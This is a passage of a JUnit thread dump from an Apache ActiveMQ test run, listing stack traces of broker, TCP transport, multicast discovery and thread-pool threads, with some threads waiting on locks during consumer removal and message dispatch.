java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp:///127.0.0.1:53754" daemon prio=9 tid=0x005383d0 nid=0x1850e00 runnable &#91;0xf20b1000..0xf20b1ad0&#93;    &#91;junit&#93;     at java.net.SocketInputStream.socketRead0(Native Method)    &#91;junit&#93;     at java.net.SocketInputStream.read(SocketInputStream.java:129)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)    &#91;junit&#93;     at java.io.DataInputStream.readInt(DataInputStream.java:353)    &#91;junit&#93;     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp:///127.0.0.1:53753" daemon prio=9 tid=0x005362f0 nid=0x182a200 runnable &#91;0xf1f2e000..0xf1f2ead0&#93;    &#91;junit&#93;     at java.net.SocketInputStream.socketRead0(Native Method)    &#91;junit&#93;     at java.net.SocketInputStream.read(SocketInputStream.java:129)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)    &#91;junit&#93;     at java.io.DataInputStream.readInt(DataInputStream.java:353)    &#91;junit&#93;     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp://localhost/127.0.0.1:53745" prio=5 tid=0x00537340 nid=0x1916400 waiting for monitor entry &#91;0xf21b2000..0xf21b3ad0&#93;    &#91;junit&#93;     at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:58)    &#91;junit&#93;     - waiting to lock <0x1c8c9340> (a org.apache.activemq.broker.region.QueueSubscription)    &#91;junit&#93;     at org.apache.activemq.broker.region.QueueSubscription.add(QueueSubscription.java:38)    &#91;junit&#93;     at org.apache.activemq.broker.region.policy.RoundRobinDispatchPolicy.dispatch(RoundRobinDispatchPolicy.java:53)    &#91;junit&#93;     - locked <0x1c926f28> (a edu.emory.mathcs.backport.java.util.concurrent.CopyOnWriteArrayList)    &#91;junit&#93;     at org.apache.activemq.broker.region.Queue.removeSubscription(Queue.java:210)    &#91;junit&#93;     - locked <0x1c926760> (a java.util.LinkedList)    &#91;junit&#93;     at org.apache.activemq.broker.region.AbstractRegion.removeConsumer(AbstractRegion.java:179)    &#91;junit&#93;     at org.apache.activemq.broker.region.RegionBroker.removeConsumer(RegionBroker.java:280)    &#91;junit&#93;     at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:95)    &#91;junit&#93;     at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:164)    &#91;junit&#93;     at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:95)    &#91;junit&#93;     at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:107)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.processRemoveConsumer(AbstractConnection.java:431)    &#91;junit&#93;     at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:63)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)    &#91;junit&#93;     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)    &#91;junit&#93;     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    &#91;junit&#93;     at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:75)    &#91;junit&#93;     at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)    &#91;junit&#93;     - locked <0x1c80aac8> (a java.lang.Object)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteConsumerAdvisory(DemandForwardingBridge.java:331)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteCommand(DemandForwardingBridge.java:235)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge$2.onCommand(DemandForwardingBridge.java:121)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)    &#91;junit&#93;     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    &#91;junit&#93;     at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:103)    &#91;junit&#93;     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)    &#91;junit&#93;     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp://localhost/127.0.0.1:53745" prio=5 tid=0x00536f80 nid=0x1843c00 runnable &#91;0xf2132000..0xf2132ad0&#93;    &#91;junit&#93;     at java.net.SocketInputStream.socketRead0(Native Method)    &#91;junit&#93;     at java.net.SocketInputStream.read(SocketInputStream.java:129)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)    &#91;junit&#93;     at java.io.DataInputStream.readInt(DataInputStream.java:353)    &#91;junit&#93;     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp:///127.0.0.1:53752" daemon prio=9 tid=0x00533fe0 nid=0x190ec00 runnable &#91;0xf1ca9000..0xf1ca9ad0&#93;    &#91;junit&#93;     at java.net.SocketInputStream.socketRead0(Native Method)    &#91;junit&#93;     at java.net.SocketInputStream.read(SocketInputStream.java:129)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)    &#91;junit&#93;     at java.io.DataInputStream.readInt(DataInputStream.java:353)    &#91;junit&#93;     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "ActiveMQ Default Thread Pool Thread" daemon prio=5 tid=0x00536450 nid=0x182b600 in Object.wait() &#91;0xf1faf000..0xf1fafad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c4a8840> (a java.lang.Object)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:152)    &#91;junit&#93;     - locked <0x1c4a8840> (a java.lang.Object)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "Transport Status Dector org.apache.activemq.broker.TransportConnector@dc0dd8" daemon prio=9 tid=0x00534f90 nid=0x18b8c00 waiting on condition &#91;0xf18a1000..0xf18a1ad0&#93;    &#91;junit&#93;     at java.lang.Thread.sleep(Native Method)    &#91;junit&#93;     at org.apache.activemq.broker.TransportStatusDetector.run(TransportStatusDetector.java:98)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp:///127.0.0.1:53751" daemon prio=9 tid=0x00536050 nid=0x1828e00 in Object.wait() &#91;0xf1eac000..0xf1eadad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c926f00> (a java.lang.Object)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at org.apache.activemq.thread.Valve.increment(Valve.java:88)    &#91;junit&#93;     - locked <0x1c926f00> (a java.lang.Object)    &#91;junit&#93;     at org.apache.activemq.broker.region.Queue.dispatch(Queue.java:364)    &#91;junit&#93;     at org.apache.activemq.broker.region.Queue.send(Queue.java:245)    &#91;junit&#93;     at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)    &#91;junit&#93;     at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:309)    &#91;junit&#93;     at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)    &#91;junit&#93;     at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)    &#91;junit&#93;     at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)    &#91;junit&#93;     at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:337)    &#91;junit&#93;     at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)    &#91;junit&#93;     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)    &#91;junit&#93;     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    &#91;junit&#93;     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)    &#91;junit&#93;     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp://localhost/127.0.0.1:53749" prio=5 tid=0x00535aa0 nid=0x190d800 runnable &#91;0xf1e2c000..0xf1e2cad0&#93;    &#91;junit&#93;     at java.net.SocketInputStream.socketRead0(Native Method)    &#91;junit&#93;     at java.net.SocketInputStream.read(SocketInputStream.java:129)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)    &#91;junit&#93;     at java.io.DataInputStream.readInt(DataInputStream.java:353)    &#91;junit&#93;     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp://localhost/127.0.0.1:53749" prio=5 tid=0x00535600 nid=0x190d400 runnable &#91;0xf1dab000..0xf1dabad0&#93;    &#91;junit&#93;     at java.net.SocketInputStream.socketRead0(Native Method)    &#91;junit&#93;     at java.net.SocketInputStream.read(SocketInputStream.java:129)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)    &#91;junit&#93;     at java.io.DataInputStream.readInt(DataInputStream.java:353)    &#91;junit&#93;     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "MulticastDiscovery: null" daemon prio=5 tid=0x00535360 nid=0x190f000 runnable &#91;0xf1d2a000..0xf1d2aad0&#93;    &#91;junit&#93;     at java.net.PlainDatagramSocketImpl.receive0(Native Method)    &#91;junit&#93;     at java.net.PlainDatagramSocketImpl.receive(PlainDatagramSocketImpl.java:136)    &#91;junit&#93;     - locked <0x1c6d2ef0> (a java.net.PlainDatagramSocketImpl)    &#91;junit&#93;     at java.net.DatagramSocket.receive(DatagramSocket.java:712)    &#91;junit&#93;     - locked <0x1c6dff50> (a java.net.DatagramPacket)    &#91;junit&#93;     - locked <0x1c6d0800> (a java.net.MulticastSocket)    &#91;junit&#93;     at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.run(MulticastDiscoveryAgent.java:239)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp:///127.0.0.1:53750" daemon prio=9 tid=0x00534cf0 nid=0x1851600 in Object.wait() &#91;0xf1c27000..0xf1c28ad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c926f00> (a java.lang.Object)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at org.apache.activemq.thread.Valve.increment(Valve.java:88)    &#91;junit&#93;     - locked <0x1c926f00> (a java.lang.Object)    &#91;junit&#93;     at org.apache.activemq.broker.region.Queue.dispatch(Queue.java:364)    &#91;junit&#93;     at org.apache.activemq.broker.region.Queue.send(Queue.java:245)    &#91;junit&#93;     at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)    &#91;junit&#93;     at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:309)    &#91;junit&#93;     at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)    &#91;junit&#93;     at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)    &#91;junit&#93;     at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)    &#91;junit&#93;     at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:337)    &#91;junit&#93;     at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)    &#91;junit&#93;     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)    &#91;junit&#93;     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    &#91;junit&#93;     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)    &#91;junit&#93;     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "ActiveMQ Default Thread Pool Thread" daemon prio=5 tid=0x00534280 nid=0x1851200 in Object.wait() &#91;0xf1ba7000..0xf1ba7ad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c4a8840> (a java.lang.Object)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:152)    &#91;junit&#93;     - locked <0x1c4a8840> (a java.lang.Object)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "ActiveMQ Default Thread Pool Thread" daemon prio=5 tid=0x00533d40 nid=0x1850a00 in Object.wait() &#91;0xf1aa5000..0xf1aa5ad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c4a8840> (a java.lang.Object)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:152)    &#91;junit&#93;     - locked <0x1c4a8840> (a java.lang.Object)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "Transport Status Dector org.apache.activemq.broker.TransportConnector@c47680" daemon prio=9 tid=0x005337f0 nid=0x1850600 waiting on condition &#91;0xf1a24000..0xf1a24ad0&#93;    &#91;junit&#93;     at java.lang.Thread.sleep(Native Method)    &#91;junit&#93;     at org.apache.activemq.broker.TransportStatusDetector.run(TransportStatusDetector.java:98)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "MulticastDiscovery: tcp://bigmac-6.local:53749" daemon prio=5 tid=0x00533380 nid=0x1850200 runnable &#91;0xf19a3000..0xf19a3ad0&#93;    &#91;junit&#93;     at java.net.PlainDatagramSocketImpl.receive0(Native Method)    &#91;junit&#93;     at java.net.PlainDatagramSocketImpl.receive(PlainDatagramSocketImpl.java:136)    &#91;junit&#93;     - locked <0x1c64c530> (a java.net.PlainDatagramSocketImpl)    &#91;junit&#93;     at java.net.DatagramSocket.receive(DatagramSocket.java:712)    &#91;junit&#93;     - locked <0x1c64c570> (a java.net.DatagramPacket)    &#91;junit&#93;     - locked <0x1c64c590> (a java.net.MulticastSocket)    &#91;junit&#93;     at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.run(MulticastDiscoveryAgent.java:239)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "TcpTransportServer@tcp://bigmac-6.local:53749" daemon prio=9 tid=0x00532f90 nid=0x1851a00 runnable &#91;0xf1922000..0xf1922ad0&#93;    &#91;junit&#93;     at java.net.PlainSocketImpl.socketAccept(Native Method)    &#91;junit&#93;     at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384)    &#91;junit&#93;     - locked <0x1c6d1928> (a java.net.SocksSocketImpl)    &#91;junit&#93;     at java.net.ServerSocket.implAccept(ServerSocket.java:450)    &#91;junit&#93;     at java.net.ServerSocket.accept(ServerSocket.java:421)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransportServer.run(TcpTransportServer.java:96)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "ActiveMQ Scheduler" daemon prio=5 tid=0x00532a00 nid=0x18b8800 in Object.wait() &#91;0xf1820000..0xf1820ad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c3d6210> (a java.lang.Object)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:432)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.TimeUnit.timedWait(TimeUnit.java:294)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:156)    &#91;junit&#93;     - locked <0x1c3d6210> (a java.lang.Object)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp://localhost/127.0.0.1:53747" prio=5 tid=0x00530620 nid=0x18b9600 runnable &#91;0xf179f000..0xf179fad0&#93;    &#91;junit&#93;     at java.net.SocketInputStream.socketRead0(Native Method)    &#91;junit&#93;     at java.net.SocketInputStream.read(SocketInputStream.java:129)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)    &#91;junit&#93;     at java.io.DataInputStream.readInt(DataInputStream.java:353)    &#91;junit&#93;     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp:///127.0.0.1:53748" daemon prio=9 tid=0x00530250 nid=0x18b9200 runnable &#91;0xf171e000..0xf171ead0&#93;    &#91;junit&#93;     at java.net.SocketInputStream.socketRead0(Native Method)    &#91;junit&#93;     at java.net.SocketInputStream.read(SocketInputStream.java:129)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)    &#91;junit&#93;     at java.io.DataInputStream.readInt(DataInputStream.java:353)    &#91;junit&#93;     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "Transport Status Dector org.apache.activemq.broker.TransportConnector@d03b5b" daemon prio=9 tid=0x0052ff30 nid=0x18b8400 waiting on condition &#91;0xf169d000..0xf169dad0&#93;    &#91;junit&#93;     at java.lang.Thread.sleep(Native Method)    &#91;junit&#93;     at org.apache.activemq.broker.TransportStatusDetector.run(TransportStatusDetector.java:98)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "ActiveMQ Default Thread Pool Thread" daemon prio=5 tid=0x0052f8e0 nid=0x18c6e00 in Object.wait() &#91;0xf161c000..0xf161cad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c4a8840> (a java.lang.Object)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:152)    &#91;junit&#93;     - locked <0x1c4a8840> (a java.lang.Object)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "MulticastDiscovery: null" daemon prio=5 tid=0x0052f640 nid=0x18c6a00 runnable &#91;0xf159b000..0xf159bad0&#93;    &#91;junit&#93;     at java.net.PlainDatagramSocketImpl.receive0(Native Method)    &#91;junit&#93;     at java.net.PlainDatagramSocketImpl.receive(PlainDatagramSocketImpl.java:136)    &#91;junit&#93;     - locked <0x1c517f78> (a java.net.PlainDatagramSocketImpl)    &#91;junit&#93;     at java.net.DatagramSocket.receive(DatagramSocket.java:712)    &#91;junit&#93;     - locked <0x1c59c280> (a java.net.DatagramPacket)    &#91;junit&#93;     - locked <0x1c517fb8> (a java.net.MulticastSocket)    &#91;junit&#93;     at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.run(MulticastDiscoveryAgent.java:239)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "Transport Status Dector org.apache.activemq.broker.TransportConnector@215748" daemon prio=9 tid=0x0052f1c0 nid=0x18c6600 waiting on condition &#91;0xf151a000..0xf151aad0&#93;    &#91;junit&#93;     at java.lang.Thread.sleep(Native Method)    &#91;junit&#93;     at org.apache.activemq.broker.TransportStatusDetector.run(TransportStatusDetector.java:98)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "MulticastDiscovery: tcp://bigmac-6.local:53747" daemon prio=5 tid=0x0052edf0 nid=0x18b9e00 runnable &#91;0xf1499000..0xf1499ad0&#93;    &#91;junit&#93;     at java.net.PlainDatagramSocketImpl.receive0(Native Method)    &#91;junit&#93;     at java.net.PlainDatagramSocketImpl.receive(PlainDatagramSocketImpl.java:136)    &#91;junit&#93;     - locked <0x1c51a138> (a java.net.PlainDatagramSocketImpl)    &#91;junit&#93;     at java.net.DatagramSocket.receive(DatagramSocket.java:712)    &#91;junit&#93;     - locked <0x1c51a178> (a java.net.DatagramPacket)    &#91;junit&#93;     - locked <0x1c51a198> (a java.net.MulticastSocket)    &#91;junit&#93;     at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.run(MulticastDiscoveryAgent.java:239)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "TcpTransportServer@tcp://bigmac-6.local:53747" daemon prio=9 tid=0x0052e9b0 nid=0x18b9a00 runnable &#91;0xf1418000..0xf1418ad0&#93;    &#91;junit&#93;     at java.net.PlainSocketImpl.socketAccept(Native Method)    &#91;junit&#93;     at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384)    &#91;junit&#93;     - locked <0x1c51a288> (a java.net.SocksSocketImpl)    &#91;junit&#93;     at java.net.ServerSocket.implAccept(ServerSocket.java:450)    &#91;junit&#93;     at java.net.ServerSocket.accept(ServerSocket.java:421)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransportServer.run(TcpTransportServer.java:96)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "ActiveMQ Scheduler" daemon prio=5 tid=0x0052dcf0 nid=0x184a600 in Object.wait() &#91;0xf1397000..0xf1397ad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c3d6210> (a java.lang.Object)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:432)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.TimeUnit.timedWait(TimeUnit.java:294)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:156)    &#91;junit&#93;     - locked <0x1c3d6210> (a java.lang.Object)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp:///127.0.0.1:53746" daemon prio=9 tid=0x0052bd60 nid=0x1907c00 runnable &#91;0xf1214000..0xf1214ad0&#93;    &#91;junit&#93;     at java.net.SocketInputStream.socketRead0(Native Method)    &#91;junit&#93;     at java.net.SocketInputStream.read(SocketInputStream.java:129)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)    &#91;junit&#93;     at java.io.DataInputStream.readInt(DataInputStream.java:353)    &#91;junit&#93;     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp://localhost/127.0.0.1:53745" prio=5 tid=0x0052ba20 nid=0x1908000 in Object.wait() &#91;0xf1193000..0xf1193ad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c4f4728> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch.await(CountDownLatch.java:173)    &#91;junit&#93;     - locked <0x1c4f4728> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge.waitStarted(DemandForwardingBridge.java:481)    &#91;junit&#93;     at 